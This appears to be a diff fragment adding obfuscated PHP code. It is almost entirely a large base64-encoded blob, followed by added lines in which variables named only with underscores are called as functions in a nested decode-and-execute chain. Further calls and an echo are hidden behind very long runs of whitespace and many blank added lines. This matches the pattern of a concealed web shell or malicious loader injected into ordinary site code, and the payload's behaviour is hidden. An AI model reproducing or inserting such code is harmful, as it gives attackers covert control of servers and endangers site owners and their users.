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//yskOYw==';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
